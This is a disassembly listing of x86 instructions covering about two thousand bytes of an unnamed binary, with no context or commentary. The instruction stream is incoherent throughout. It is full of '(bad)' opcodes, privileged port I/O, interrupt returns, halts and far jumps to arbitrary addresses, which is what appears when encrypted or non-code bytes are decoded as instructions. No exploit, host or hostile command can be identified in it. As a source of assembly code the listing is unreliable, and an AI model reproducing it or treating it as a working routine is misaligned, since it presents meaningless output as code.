  4146e6:	mov    al,BYTE PTR [ebx]
  4146e8:	xor    al,BYTE PTR [edi+esi*2]
  4146eb:	push   cs
  4146ec:	lahf   
  4146ed:	push   0xe61f85ba
  4146f2:	sub    al,0xdc
  4146f4:	xchg   ebp,eax
  4146f5:	cmp    esp,eax
  4146f7:	xchg   ecx,eax
  4146f8:	aad    0xce
  4146fa:	sub    BYTE PTR ds:0x7228d620,al
  414700:	pop    ebx
  414701:	and    DWORD PTR [ecx-0x40ec4939],edx
  414707:	ds iret 
  414709:	test   eax,0xc4fee1f2
  41470e:	out    dx,eax
  41470f:	mov    esi,0x57e95498
  414714:	ins    DWORD PTR es:[edi],dx
  414715:	xchg   ecx,eax
  414716:	mov    ebx,0x4b233651
  41471b:	fnsave [esi+0x67a83a36]
  414721:	aam    0x33
  414723:	cld    
  414724:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414725:	stos   DWORD PTR es:[edi],eax
  414726:	(bad)  
  414727:	out    dx,al
  414728:	fistp  DWORD PTR [eax+0x44346724]
  41472e:	retf   0x4ce2
  414731:	mov    eax,ds:0x883bf3c5
  414736:	popa   
  414737:	pop    fs
  414739:	jle    0x4146d8
  41473b:	mov    dh,0xd3
  41473d:	out    dx,eax
  41473e:	imul   ebx,esp,0x18d0917f
  414744:	in     eax,dx
  414745:	push   edx
  414746:	mov    al,ds:0x468fbe1d
  41474b:	retf   
  41474c:	push   edi
  41474d:	iret   
  41474e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41474f:	int    0xf6
  414751:	mov    bl,0xe0
  414753:	fild   WORD PTR [eax+0x44]
  414756:	xchg   edi,eax
  414757:	test   BYTE PTR [ebx+ecx*2],bl
  41475a:	fldl2t 
  41475c:	pop    esi
  41475d:	xchg   esp,eax
  41475e:	mov    ebx,0x282abd91
  414763:	push   ecx
  414764:	or     cl,dl
  414766:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414767:	pusha  
  414768:	xor    al,0x8b
  41476a:	shl    BYTE PTR [esi],cl
  41476c:	ja     0x41478d
  41476e:	jo     0x414752
  414770:	adc    BYTE PTR [edi-0x5b],0xaf
  414774:	shl    DWORD PTR [esi],1
  414776:	mov    edi,0x54fa4294
  41477b:	scas   eax,DWORD PTR es:[edi]
  41477c:	sti    
  41477d:	ds dec ebp
  41477f:	pop    ecx
  414780:	cmp    bl,BYTE PTR [ebx+ecx*8-0x25fdcdbf]
  414787:	cld    
  414788:	inc    esp
  414789:	test   esi,ebx
  41478b:	mov    edx,0xe66b9053
  414790:	sbb    DWORD PTR [esi+0x4b3db7e2],edx
  414796:	push   edi
  414797:	jns    0x4147dc
  414799:	hlt    
  41479a:	in     eax,dx
  41479b:	push   ebp
  41479c:	(bad)  
  41479d:	repz mov dl,0xa0
  4147a0:	mov    ebp,0x31b3477e
  4147a5:	dec    ecx
  4147a6:	scas   al,BYTE PTR es:[edi]
  4147a7:	xchg   esp,eax
  4147a8:	pop    edx
  4147a9:	and    ah,dh
  4147ab:	jl     0x4147d1
  4147ad:	arpl   WORD PTR [ebp-0x1b],dx
  4147b0:	jg     0x414775
  4147b2:	sbb    dl,al
  4147b4:	test   BYTE PTR [edi+0x36cfd2f9],bh
  4147ba:	mov    esp,0x21801847
  4147bf:	test   dh,bl
  4147c1:	sbb    BYTE PTR [edi],bl
  4147c3:	inc    eax
  4147c4:	sub    al,al
  4147c6:	data16 sbb al,0xe5
  4147ca:	pop    eax
  4147cb:	mov    bh,0x2b
  4147cd:	adc    dh,BYTE PTR [eax+0x6c7be5d8]
  4147d3:	push   edi
  4147d4:	xchg   ebp,edi
  4147d6:	cmp    esi,ebp
  4147d8:	ficom  WORD PTR [eax-0x60]
  4147db:	cdq    
  4147dc:	bound  eax,QWORD PTR [ebx-0x5f]
  4147df:	and    eax,0x32b2d547
  4147e4:	jb     0x414804
  4147e6:	repnz push es
  4147e8:	ss fwait
  4147ea:	mov    ds:0xc03b2c84,eax
  4147ef:	inc    ebp
  4147f0:	push   edi
  4147f1:	jmp    0xde309343
  4147f6:	mov    bh,0x32
  4147f8:	jae    0x41483e
  4147fa:	pop    ebx
  4147fb:	lahf   
  4147fc:	cmp    eax,ebx
  4147fe:	iret   
  4147ff:	mov    eax,0x906aed83
  414804:	inc    ebx
  414805:	mov    ebx,esp
  414807:	jns    0x4147ff
  414809:	loope  0x414874
  41480b:	jge    0x414805
  41480d:	ss pop ds
  41480f:	mov    esi,0xbb9ea3b3
  414814:	test   eax,0x3231a833
  414819:	sbb    eax,0x9bf5e8fe
  41481e:	add    edx,DWORD PTR [esi+0x19]
  414821:	xchg   esi,eax
  414822:	idiv   DWORD PTR [ecx-0x75fef6c8]
  414828:	add    eax,0x91fd46b8
  41482d:	cli    
  41482e:	xor    eax,0x62a9bbf8
  414833:	sbb    eax,DWORD PTR [edi+0x36]
  414836:	mov    esp,0xbad7f536
  41483b:	ins    BYTE PTR es:[edi],dx
  41483c:	inc    edx
  41483d:	mov    eax,ds:0xcc522278
  414842:	nop
  414843:	sub    BYTE PTR [eax+0x3ddfb857],al
  414849:	push   edx
  41484a:	push   eax
  41484b:	and    al,0x52
  41484d:	or     DWORD PTR [ecx+0x3638ecac],esp
  414853:	sbb    ebp,DWORD PTR [eax]
  414855:	mov    ebp,0x116819e
  41485a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41485b:	in     al,0x6
  41485d:	xor    dh,al
  41485f:	pop    ebp
  414860:	cmp    BYTE PTR [eax],al
  414862:	adc    eax,0x22eec672
  414867:	rol    DWORD PTR [ebx],1
  414869:	cmp    al,0x6e
  41486b:	(bad)  
  41486c:	jne    0x4148a2
  41486e:	mov    cl,0x1a
  414870:	sbb    dl,BYTE PTR [esi+0x7df2b0b8]
  414876:	lds    esp,FWORD PTR [edx]
  414878:	add    eax,0x96d2e533
  41487d:	push   edx
  41487e:	sub    eax,0xd185ca81
  414883:	call   DWORD PTR [ecx]
  414885:	mov    ds:0xbe16d373,al
  41488a:	adc    eax,0xed0e8c29
  41488f:	adc    esi,ebx
  414891:	sub    eax,0x13882c46
  414896:	retf   
  414897:	xor    eax,0xdd8882be
  41489c:	fdivr  QWORD PTR [esi-0x20]
  41489f:	and    bl,ah
  4148a1:	mov    edi,ebx
  4148a3:	dec    ebx
  4148a4:	mov    bl,0xd
  4148a6:	cmc    
  4148a7:	add    esi,ebx
  4148a9:	or     DWORD PTR [ecx+edi*8+0x41fa6598],edi
  4148b0:	or     ebp,DWORD PTR [eax]
  4148b2:	dec    ecx
  4148b3:	jns    0x414855
  4148b5:	sbb    esi,DWORD PTR [esi]
  4148b7:	pop    esi
  4148b8:	std    
  4148b9:	addr16 pop ebp
  4148bb:	and    eax,DWORD PTR [edx]
  4148bd:	shl    ecx,cl
  4148bf:	jno    0x414871
  4148c1:	and    cl,cl
  4148c3:	pop    ecx
  4148c4:	xchg   esp,eax
  4148c5:	aaa    
  4148c6:	xchg   esi,eax
  4148c7:	or     DWORD PTR [ebx-0x4258fc0c],eax
  4148cd:	retf   0x67ea
  4148d0:	cmp    al,0x6c
  4148d2:	into   
  4148d3:	mov    edx,0x22b9ba20
  4148d8:	xor    DWORD PTR [ecx],0x4a
  4148db:	pop    esi
  4148dc:	int3   
  4148dd:	mov    ebx,0x59b969b1
  4148e2:	xchg   esp,eax
  4148e3:	dec    esp
  4148e4:	(bad)  
  4148e5:	jp     0x41489c
  4148e7:	cli    
  4148e8:	adc    BYTE PTR [eax-0x33],cl
  4148eb:	in     eax,0x19
  4148ed:	adc    al,0xdf
  4148ef:	jl     0x414905
  4148f1:	aaa    
  4148f2:	jg     0x41488d
  4148f4:	xor    ah,BYTE PTR [ecx-0x71]
  4148f7:	es out dx,al
  4148f9:	cmp    DWORD PTR [ecx-0x3a],ebp
  4148fc:	pushf  
  4148fd:	mov    cl,BYTE PTR [esi]
  4148ff:	xchg   ebp,eax
  414900:	inc    DWORD PTR [edi]
  414902:	adc    eax,0x8a05e3ec
  414907:	shl    cl,cl
  414909:	pop    ss
  41490a:	xor    ebp,DWORD PTR [ebx+0x1c]
  41490d:	sbb    DWORD PTR [edx-0x6609ea3f],esi
  414913:	out    dx,al
  414914:	out    0xeb,eax
  414916:	es adc al,0xd9
  414919:	push   eax
  41491a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41491b:	pusha  
  41491c:	lods   eax,DWORD PTR ds:[esi]
  41491d:	ror    DWORD PTR [ecx],cl
  41491f:	rcl    BYTE PTR [eax-0x2],cl
  414922:	cmp    eax,0xf62d3d3a
  414927:	or     al,0x13
  414929:	jge    0x4148ac
  41492b:	mov    ch,0xe5
  41492d:	jmp    0x41490b
  41492f:	nop
  414930:	sub    bh,dl
  414932:	mov    cs,WORD PTR [eax+0x4d]
  414935:	pop    ss
  414936:	adc    ch,dh
  414938:	sub    al,0xd3
  41493a:	jl     0x41495e
  41493c:	int    0x68
  41493e:	push   ds
  41493f:	loopne 0x4149be
  414941:	shl    BYTE PTR [eax-0x4ac8907e],cl
  414947:	ds add eax,0xe12a6e84
  41494d:	mov    eax,0xb13accbc
  414952:	or     cl,BYTE PTR [ebx]
  414954:	je     0x414956
  414956:	cmp    eax,0x213f48c4
  41495b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41495c:	out    dx,eax
  41495d:	mov    dl,0x6d
  41495f:	call   0xa344:0x4ca89776
  414966:	nop
  414967:	pop    edx
  414968:	call   0xe069:0xafc13f67
  41496f:	and    ebx,DWORD PTR [edx]
  414971:	xor    ebx,DWORD PTR [edx-0x3703c3dc]
  414977:	test   eax,0x83c0ab07
  41497c:	or     al,0x26
  41497e:	leave  
  41497f:	jno    0x4149dd
  414981:	add    bl,ch
  414983:	outs   dx,DWORD PTR ds:[esi]
  414984:	call   0xe876:0x90c7510e
  41498b:	inc    ebx
  41498c:	cmp    al,0xe2
  41498e:	sub    DWORD PTR [esi-0x11],esp
  414991:	call   0x88b:0x88638ce4
  414998:	push   edx
  414999:	into   
  41499a:	lds    ebx,FWORD PTR [ecx]
  41499c:	ins    BYTE PTR es:[edi],dx
  41499d:	ret    
  41499e:	pop    ebp
  41499f:	imul   eax,DWORD PTR [esi+0x3c477879],0xb52240a5
  4149a9:	lahf   
  4149aa:	push   0xfffffff6
  4149ac:	ins    BYTE PTR es:[edi],dx
  4149ad:	es inc edi
  4149af:	add    bh,BYTE PTR [esi-0x78]
  4149b2:	ret    
  4149b3:	sub    DWORD PTR [esi-0x5c],esi
  4149b6:	bound  ecx,QWORD PTR [ebx-0x7b]
  4149b9:	mov    ds:0x73d50483,eax
  4149be:	lds    edx,FWORD PTR [ebp+0x4b]
  4149c1:	jecxz  0x414a37
  4149c3:	add    esi,DWORD PTR [edi+0x10]
  4149c6:	iret   
  4149c7:	sub    BYTE PTR [ecx-0x39856050],0xb4
  4149ce:	sbb    DWORD PTR [esi],ebp
  4149d0:	imul   esp,esi,0x7
  4149d3:	leave  
  4149d4:	call   0x5b91:0xd0a45af
  4149db:	fisub  DWORD PTR [ebx-0x70248425]
  4149e1:	xor    BYTE PTR [esi+ebp*1+0x5a],dl
  4149e5:	mov    dl,0x1f
  4149e7:	js     0x4149b2
  4149e9:	mov    bh,0x2a
  4149eb:	sti    
  4149ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4149ed:	jecxz  0x4149f4
  4149ef:	scas   eax,DWORD PTR es:[edi]
  4149f0:	and    BYTE PTR [eax],dh
  4149f2:	retf   
  4149f3:	and    BYTE PTR [ebx+0x42],dl
  4149f6:	or     ch,BYTE PTR [esi-0x6ec85506]
  4149fc:	(bad)  
  4149fd:	aad    0xc4
  4149ff:	dec    eax
  414a00:	and    eax,0x8bc91f67
  414a05:	enter  0x855e,0x5
  414a09:	mov    edi,0x2204e07
  414a0e:	cmp    ebp,esi
  414a10:	push   es
  414a11:	xchg   edx,eax
  414a12:	add    ecx,esp
  414a14:	call   0x5af76998
  414a19:	push   0x43a7a7d3
  414a1e:	or     BYTE PTR [edx-0x7a],ch
  414a21:	mov    al,ds:0xb248aec0
  414a26:	cli    
  414a27:	adc    cl,BYTE PTR [eax+ebp*2-0x11]
  414a2b:	and    BYTE PTR [edx+0x42],dh
  414a2e:	dec    esp
  414a2f:	adc    ebx,0xffffffd9
  414a32:	cld    
  414a33:	add    eax,0x906d9f31
  414a38:	dec    edx
  414a39:	out    0xe4,eax
  414a3b:	adc    ch,BYTE PTR [ebp-0x20d076a5]
  414a41:	clc    
  414a42:	push   esp
  414a43:	fs cdq 
  414a45:	mov    cl,0xf4
  414a47:	or     DWORD PTR [eax-0x50],esi
  414a4a:	or     edx,DWORD PTR [ebx+0x12]
  414a4d:	(bad)  
  414a4e:	into   
  414a4f:	cld    
  414a50:	daa    
  414a51:	ds push cs
  414a53:	push   cs
  414a54:	ins    BYTE PTR es:[edi],dx
  414a55:	stos   BYTE PTR es:[edi],al
  414a56:	xchg   ecx,eax
  414a57:	dec    esi
  414a58:	es (bad) 
  414a5a:	stc    
  414a5b:	leave  
  414a5c:	je     0x414a63
  414a5e:	fwait
  414a5f:	inc    esp
  414a60:	or     esp,DWORD PTR ds:[ebx-0x408c246e]
  414a67:	fnstsw ax
  414a69:	jne    0x414a56
  414a6b:	daa    
  414a6c:	pop    ebp
  414a6d:	retf   
  414a6e:	adc    ebp,DWORD PTR [ebx-0xc997f2e]
  414a74:	lock div DWORD PTR [ebx+eiz*2]
  414a78:	(bad)  
  414a79:	(bad)  
  414a7a:	repz pop edx
  414a7c:	jne    0x414a57
  414a7e:	xchg   esp,edi
  414a80:	pop    ebx
  414a81:	xor    BYTE PTR gs:[esi],cl
  414a84:	push   cs
  414a85:	scas   al,BYTE PTR es:[edi]
  414a86:	push   0x73
  414a88:	xor    eax,0xaa8832ec
  414a8d:	mov    ebp,0x6a9ebe5b
  414a92:	sbb    BYTE PTR [esi+0x2e14e338],dh
  414a98:	out    0x41,eax
  414a9a:	test   eax,0x97b55f17
  414a9f:	pop    ebp
  414aa0:	mov    ch,0xe6
  414aa2:	mov    eax,0x70af5504
  414aa7:	out    dx,eax
  414aa8:	repnz retf 0x312f
  414aac:	sub    dh,dl
  414aae:	pop    edi
  414aaf:	jne    0x414a68
  414ab1:	aas    
  414ab2:	push   ds
  414ab3:	scas   al,BYTE PTR es:[edi]
  414ab4:	rcl    BYTE PTR [edi+0x35],cl
  414ab7:	repnz repnz pushf 
  414aba:	push   0x4136609
  414abf:	in     al,0xc6
  414ac1:	fisub  DWORD PTR ds:0x995bfe6e
  414ac7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414ac8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414ac9:	(bad)
  414acd:	int    0x86
  414acf:	int3   
  414ad0:	push   ecx
  414ad1:	call   0x58575a64
  414ad6:	pop    eax
  414ad8:	mov    ds:0x5032d833,al
  414add:	shr    DWORD PTR [edi+0x6051fd2b],1
  414ae3:	retf   0x2281
  414ae6:	cmp    al,0xcf
  414ae8:	pop    edx
  414ae9:	jp     0x414a76
  414aeb:	mov    ebp,0x6cb1f50e
  414af0:	xchg   esi,eax
  414af1:	push   esp
  414af2:	jp     0x414ab9
  414af4:	sub    DWORD PTR [esi],0xb21c15be
  414afa:	ins    DWORD PTR es:[edi],dx
  414afb:	mov    ds,WORD PTR [ebx-0x2f]
  414afe:	mov    esi,0xbd6cf78
  414b03:	sbb    bl,BYTE PTR [eax]
  414b05:	icebp  
  414b06:	jmp    0x414b11
  414b08:	scas   al,BYTE PTR es:[edi]
  414b09:	xchg   ebx,eax
  414b0a:	mov    ds:0x4a2b098c,eax
  414b0f:	xchg   esp,eax
  414b10:	pop    esi
  414b11:	bound  edx,QWORD PTR [esi+0x9]
  414b14:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414b15:	push   cs
  414b16:	push   ebp
  414b17:	adc    BYTE PTR [ecx+ebp*4+0x59],al
  414b1b:	jb     0x92aa1c0c
  414b21:	dec    ecx
  414b22:	cwde   
  414b23:	add    BYTE PTR [edx+0x1e],ch
  414b26:	mov    al,0x32
  414b28:	stos   DWORD PTR es:[edi],eax
  414b29:	mov    dl,0x6d
  414b2b:	call   DWORD PTR [ecx+0x47]
  414b2e:	jp     0x414b51
  414b30:	cmc    
  414b31:	xchg   edi,eax
  414b32:	and    BYTE PTR [esi+0x7d],cl
  414b35:	shr    BYTE PTR [ecx+0x7ced1182],0x62
  414b3c:	std    
  414b3d:	hlt    
  414b3e:	jmp    0x58ffd5a6
  414b43:	pop    ss
  414b44:	mov    BYTE PTR [edi],ch
  414b46:	add    al,0xed
  414b48:	leave  
  414b49:	and    dl,al
  414b4b:	push   ss
  414b4c:	sub    al,0xd5
  414b4e:	mov    DWORD PTR [edx-0x5c48b6f4],ecx
  414b54:	ficom  DWORD PTR [ebx+edx*4-0x3d891650]
  414b5b:	inc    edi
  414b5c:	and    BYTE PTR [edx+0x6c],ch
  414b5f:	jbe    0x414b9d
  414b61:	test   ecx,esi
  414b63:	test   DWORD PTR [ebp-0x329093b3],0x50769261
  414b6d:	shl    BYTE PTR [edx+ebx*1-0xa0a1f83],cl
  414b74:	lods   al,BYTE PTR ds:[esi]
  414b75:	fld    QWORD PTR ds:0x604676d9
  414b7b:	pop    ss
  414b7c:	mov    ebx,cs
  414b7e:	push   edi
  414b7f:	aaa    
  414b80:	imul   ecx,DWORD PTR [ebx],0x3378a086
  414b86:	adc    edi,DWORD PTR [esi+0x75]
  414b89:	cmp    dh,BYTE PTR [ebx-0x1a]
  414b8c:	mov    DWORD PTR [esi+0x1e670f56],0x571054af
  414b96:	mov    ?,WORD PTR [eax+eax*2+0x1d9550e4]
  414b9d:	mov    al,BYTE PTR [ecx-0x77]
  414ba0:	pusha  
  414ba1:	xchg   edi,eax
  414ba2:	push   ebp
  414ba3:	dec    edx
  414ba4:	imul   eax,DWORD PTR [ecx+ebx*2],0x38c1c416
  414bab:	jne    0x414ba4
  414bad:	xchg   ebx,eax
  414bae:	xor    bh,BYTE PTR [ebx+0x1b6eb25b]
  414bb4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414bb5:	sub    ah,BYTE PTR [edi-0x5a]
  414bb8:	or     BYTE PTR [eax-0x69f549d3],dh
  414bbe:	lahf   
  414bbf:	xchg   DWORD PTR [ebp-0x2e],eax
  414bc2:	ja     0x414bec
  414bc4:	jg     0x414bb9
  414bc6:	(bad)  
  414bc7:	test   BYTE PTR [ecx+0x45],0xcd
  414bcb:	test   BYTE PTR ds:0x18f79827,0x79
  414bd2:	jmp    0xf35efd09
  414bd7:	inc    ecx
  414bd8:	cmc    
  414bd9:	fistp  WORD PTR ds:0xc60f4b5a
  414bdf:	(bad)  
  414be0:	pop    ss
  414be1:	push   esp
  414be2:	ins    DWORD PTR es:[edi],dx
  414be3:	push   edx
  414be4:	in     al,dx
  414be5:	sub    esp,DWORD PTR [edx]
  414be7:	in     al,0x8c
  414be9:	in     eax,0x7
  414beb:	je     0x414b74
  414bed:	rcr    BYTE PTR [edi+0x70788ba2],cl
  414bf3:	xchg   esp,eax
  414bf4:	shl    DWORD PTR [esp+edx*2+0x1d],0x9f
  414bf9:	ins    BYTE PTR es:[edi],dx
  414bfa:	(bad)  
  414bfb:	mov    esp,0x430f6b50
  414c00:	repz cmc 
  414c02:	scas   al,BYTE PTR es:[edi]
  414c03:	fidivr WORD PTR [eax+0x79]
  414c06:	icebp  
  414c07:	jne    0x414bb7
  414c09:	mov    ebp,cs
  414c0b:	and    esi,esi
  414c0d:	mov    eax,ds:0x6701312c
  414c12:	imul   DWORD PTR ds:0xafde74e5
  414c18:	sub    al,0x24
  414c1a:	cwde   
  414c1b:	dec    eax
  414c1c:	inc    ecx
  414c1d:	retf   
  414c1e:	call   0x40f4:0x7b24992d
  414c25:	and    eax,0x9911765b
  414c2a:	jg     0x414c0a
  414c2c:	frstor [edx]
  414c2e:	mov    cl,0xd7
  414c30:	adc    al,0x9
  414c32:	mov    ch,0x1f
  414c34:	xor    bh,BYTE PTR [ecx]
  414c36:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414c37:	rol    DWORD PTR [eax+eiz*8+0x6bd4336a],0x20
  414c3f:	dec    edi
  414c40:	and    edx,ebp
  414c42:	inc    esp
  414c43:	daa    
  414c44:	push   esp
  414c45:	test   DWORD PTR [edi],ebx
  414c47:	push   esi
  414c48:	jmp    0xfbdfd76f
  414c4d:	int    0xe8
  414c4f:	cmp    al,BYTE PTR [ecx]
  414c51:	sub    eax,0x74da78d8
  414c56:	not    DWORD PTR [esi+eax*4-0x3e7c716]
  414c5d:	inc    edx
  414c5e:	shl    BYTE PTR [edx],1
  414c60:	cmp    cl,dl
  414c62:	mov    ecx,DWORD PTR [ebp+0xdc8f98c]
  414c68:	pop    es
  414c69:	inc    esp
  414c6a:	or     eax,0x2285643
  414c6f:	pushf  
  414c70:	ret    
  414c71:	stos   BYTE PTR es:[edi],al
  414c72:	ins    BYTE PTR es:[edi],dx
  414c73:	data16 jmp 0x414c42
  414c76:	push   es
  414c77:	xlat   BYTE PTR ds:[ebx]
  414c78:	cwd    
  414c7a:	xchg   ecx,eax
  414c7b:	xchg   ebp,eax
  414c7c:	loopne 0x414c11
  414c7e:	cmp    ebp,DWORD PTR [edi+0x52]
  414c81:	inc    ecx
  414c82:	hlt    
  414c83:	inc    edi
  414c84:	mov    ds:0xdd009789,al
  414c89:	cs stc 
  414c8b:	popa   
  414c8c:	inc    edx
  414c8d:	jo     0x414cc2
  414c8f:	pop    esp
  414c90:	push   edx
  414c91:	xor    BYTE PTR [eax+0x53fe8474],0x5f
  414c98:	sbb    ecx,DWORD PTR [edi+0x2a]
  414c9b:	or     edi,DWORD PTR [eax-0x364d8ba8]
  414ca1:	add    dh,BYTE PTR [eax+ebp*4-0x13]
  414ca5:	adc    DWORD PTR [edi+eiz*4-0x2c6b38c],eax
  414cac:	push   esp
  414cad:	adc    dh,dl
  414caf:	dec    ecx
  414cb0:	jb     0x414c8d
  414cb2:	stos   DWORD PTR es:[edi],eax
  414cb3:	es mov ebp,0xf43ee76e
  414cb9:	pop    edi
  414cba:	pop    esp
  414cbb:	lahf   
  414cbc:	add    al,0x50
  414cbe:	aad    0x70
  414cc0:	call   0xc64e7bcb
  414cc5:	loop   0x414cab
  414cc7:	aam    0x79
  414cc9:	lock in al,0x5
  414ccc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414ccd:	pop    eax
  414cce:	aaa    
  414ccf:	mov    ds:0x145412ea,al
  414cd4:	hlt    
  414cd5:	pop    ecx
  414cd6:	mov    bl,0x13
  414cd8:	and    BYTE PTR [ebp+0x487bcd85],0x95
  414cdf:	jl     0x414d3c
  414ce1:	and    al,BYTE PTR [esi-0x46]
  414ce4:	test   al,0x54
  414ce6:	xchg   ebx,eax
  414ce7:	fisttp QWORD PTR [edx+0x20]
  414cea:	stos   BYTE PTR es:[edi],al
  414ceb:	int3   
  414cec:	aad    0xeb
  414cee:	cmp    DWORD PTR gs:[eax+0x1507c878],0xece17049
  414cf9:	mov    ah,0xb6
  414cfb:	shr    BYTE PTR [ecx-0x245c3cb4],0x8
  414d02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414d03:	mov    ds:0x51a8ae48,al
  414d08:	stc    
  414d09:	imul   ebp,DWORD PTR [edx],0x1c
  414d0c:	adc    BYTE PTR [edx],al
  414d0e:	jb     0x414ca9
  414d10:	mov    eax,ds:0x76086e80
  414d15:	imul   eax,DWORD PTR [edx],0xe9f8f071
  414d1b:	std    
  414d1c:	int    0x54
  414d1e:	stos   BYTE PTR es:[edi],al
  414d1f:	test   esi,0x3972d0c7
  414d25:	adc    eax,ebx
  414d27:	xchg   ebx,eax
  414d28:	nop
  414d29:	repz (bad) 
  414d2b:	ds in  eax,0xa
  414d2e:	dec    ebp
  414d2f:	mov    bl,BYTE PTR [esp+eax*4-0xd]
  414d33:	rol    DWORD PTR [ebp-0x14],1
  414d36:	stos   BYTE PTR es:[edi],al
  414d37:	push   esi
  414d38:	mov    WORD PTR [ecx+0x23],?
  414d3b:	jo     0x414d05
  414d3d:	mov    ebx,0xfcd78933
  414d42:	adc    eax,DWORD PTR [edi+0x18]
  414d45:	mov    al,0xc1
  414d47:	sbb    eax,0x3148aff5
  414d4c:	sbb    DWORD PTR [esi+0x32e153da],esp
  414d52:	pop    esp
  414d53:	lea    ebp,[ebx-0x71949dc2]
  414d59:	lods   al,BYTE PTR ds:[esi]
  414d5a:	push   ebx
  414d5b:	(bad)  
  414d5c:	pop    ss
  414d5d:	mov    esi,0x7990eb46
  414d62:	mov    ah,0xaf
  414d64:	ds adc eax,0xec6dfc9e
  414d6a:	cmp    ah,bl
  414d6c:	mov    ch,bh
  414d6e:	push   eax
  414d6f:	jmp    0x5093:0x4592e50
  414d76:	dec    eax
  414d77:	test   eax,0x63e39765
  414d7c:	inc    ebx
  414d7d:	inc    ecx
  414d7e:	lods   al,BYTE PTR ds:[esi]
  414d7f:	fbstp  TBYTE PTR [ebp-0x18489dab]
  414d85:	scas   eax,DWORD PTR es:[edi]
  414d86:	stos   BYTE PTR es:[edi],al
  414d87:	and    al,BYTE PTR [edx-0x58e042ac]
  414d8d:	mov    esp,0xbbc7fe0d
  414d92:	jno    0x414d74
  414d94:	add    BYTE PTR [ecx],bl
  414d96:	mov    dh,0x78
  414d98:	mov    eax,ds:0x2e942696
  414d9d:	cmp    al,0x6a
  414d9f:	dec    ebp
  414da0:	out    dx,eax
  414da1:	mov    BYTE PTR [edi-0x51625baa],0xbc
  414da8:	stos   BYTE PTR es:[edi],al
  414da9:	push   ss
  414daa:	mov    BYTE PTR [eax-0x35],bl
  414dad:	(bad)  
  414daf:	pop    es
  414db0:	arpl   WORD PTR [eax+0xd756c51],bp
  414db6:	call   0xd570:0xaf4eeeb
  414dbd:	adc    esp,0x6b
  414dc0:	popf   
  414dc1:	adc    eax,0x864b3df8
  414dc6:	clc    
  414dc7:	mov    dh,0x56
  414dc9:	xor    al,0x4b
  414dcb:	bound  ebp,QWORD PTR [eax+0x1b]
  414dce:	xchg   ebx,eax
  414dcf:	cmp    al,0xb3
  414dd1:	call   0x63b20d8f
  414dd6:	jge    0x414d5d
  414dd8:	dec    ecx
  414dd9:	imul   ebp
  414ddb:	out    0x26,al
  414ddd:	xchg   ah,dh
  414ddf:	sub    dh,0xb8
  414de2:	jecxz  0x414d88
  414de4:	dec    edi
  414de5:	jo     0x414e0f
  414de7:	dec    edi
  414de8:	mov    ah,0x3a
  414dea:	fsubr  QWORD PTR ds:0x4e1052bd
  414df0:	ror    DWORD PTR [ecx],0xa1
  414df3:	inc    ebx
  414df4:	sub    bh,dh
  414df6:	add    DWORD PTR [esp+eiz*4+0x71],ecx
  414dfa:	(bad)  
  414dfb:	int    0x5e
  414dfd:	icebp  
  414dfe:	cmp    cl,cl
  414e00:	push   edx
  414e01:	(bad)  
  414e02:	push   esi
  414e03:	jbe    0x414e5e
  414e05:	cmp    BYTE PTR ds:0x85487321,ah
  414e0b:	lea    ebx,[edx]
  414e0d:	ror    BYTE PTR [ecx-0x7f],1
  414e10:	test   eax,0x8b75f094
  414e15:	xchg   esi,eax
  414e16:	dec    ebx
  414e17:	or     eax,0x69b0ccdc
  414e1c:	call   0xdd962ea9
  414e21:	inc    esi
  414e22:	(bad)  
  414e23:	pop    ds
  414e24:	xor    dl,BYTE PTR [eax-0x58]
  414e27:	cmp    esi,esi
  414e29:	hlt    
  414e2a:	aam    0x39
  414e2c:	cmp    dh,ah
  414e2e:	push   esi
  414e2f:	pushf  
  414e30:	in     al,0xe2
  414e32:	loope  0x414dd7
  414e34:	out    dx,al
  414e35:	push   ebp
  414e36:	push   eax
  414e37:	mov    bl,0x5b
  414e39:	dec    edi
  414e3a:	inc    esp
  414e3b:	pop    esp
  414e3c:	and    al,0x11
  414e3e:	(bad)  
  414e40:	xchg   ecx,eax
  414e41:	ror    DWORD PTR [edi+eiz*1+0x7b99bd8f],1
  414e48:	dec    esi
  414e49:	xor    al,0xbb
  414e4b:	push   edx
  414e4c:	xor    eax,0x20d261d5
  414e51:	iret   
  414e52:	inc    ebx
  414e53:	out    dx,al
  414e54:	adc    al,0x6c
  414e56:	stc    
  414e57:	retf   0x30af
  414e5a:	push   ss
  414e5b:	sbb    ch,BYTE PTR [eax-0x63b6f834]
  414e61:	mov    edi,DWORD PTR [edx]
  414e63:	ret    0xd568
  414e66:	mov    eax,0x2877aacf
  414e6b:	push   ebx
  414e6c:	sub    esi,DWORD PTR [edi+0x14d3345]
  414e72:	jg     0x414e65
  414e74:	pop    ecx
  414e75:	sub    ah,al
  414e77:	(bad)  
  414e78:	cld    
  414e79:	push   cs
  414e7a:	dec    BYTE PTR [eax]
  414e7c:	cmp    DWORD PTR [ecx-0x178bfa40],0xffffffb8
  414e83:	jno    0x414e38
  414e85:	fcomp  st(5)
  414e87:	xor    BYTE PTR [eax+eiz*2],bl
  414e8a:	int3   
  414e8b:	retf   
  414e8c:	sub    bl,BYTE PTR [eax-0x4cd7e54]
  414e92:	jmp    0x139e:0x6e308799
  414e99:	pop    es
  414e9a:	pusha  
  414e9b:	aas    
  414e9c:	repz mov ds:0xa71cac4d,al
  414ea2:	inc    esi
  414ea3:	outs   dx,BYTE PTR ds:[esi]
  414ea4:	ret    
  414ea5:	pop    edi
  414ea6:	adc    DWORD PTR [edx],ebp
  414ea8:	jae    0x414e41
  414eaa:	daa    
  414eab:	std    
  414eac:	fwait
  414ead:	jae    0x414f0b
  414eaf:	cmp    DWORD PTR [ecx],ecx
  414eb1:	jg     0x414eb9
  414eb3:	and    al,0xf2
  414eb5:	jp     0x414ed6
